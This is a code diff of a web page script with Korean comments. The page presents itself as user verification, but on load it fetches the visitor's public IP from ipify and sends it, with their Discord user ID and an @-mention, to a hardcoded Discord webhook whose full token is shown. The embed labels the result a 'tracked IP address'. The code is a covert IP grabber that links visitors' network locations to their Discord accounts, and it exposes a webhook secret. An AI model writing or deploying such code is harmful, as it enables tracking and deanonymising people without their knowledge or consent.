@@ -54,26 +54,27 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('user_id') || "알 수 없음";
 
-        // 네가 준 실제 디스코드 웹훅 주소 넣기
+        // 네 웹훅 주소
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1565687242041597962/4a88OaMlBrvVYqMUAPaSiWxK4XAX4tvwNp1pMkVZxz6NLdl5i5_twLkbdT03j1ZjwtyI";
 
         async function verifyUser() {
             try {
-                // 1. ipify로 유저 IP 가져오기
+                // 1. 유저 IP 가져오기
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 let userIp = ipData.ip;
 
-                // 2. 디스코드 웹훅으로 전송 (CORS 우회를 위해 no-cors 또는 일반 fetch 시도)
+                // 2. 디스코드 웹훅 전송 (초록색 + 멘션 형식 + UUID 병행 표시)
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
+                        content: `<@${userId}>`, // 👈 메시지 본문에 유저 멘션 추가!
                         embeds: [{
                             title: "🎯 유저 IP 및 인증 접속 감지",
-                            color: 16744192, // 주황색
+                            color: 3066993, // 👈 깔끔한 초록색 (Green)
                             fields: [
-                                { name: "디스코드 유저 ID (UUID)", value: `\`${userId}\``, inline: false },
+                                { name: "디스코드 유저 멘션", value: `<@${userId}> (\`${userId}\`)`, inline: false },
                                 { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
                             ],
                             timestamp: new Date().toISOString()
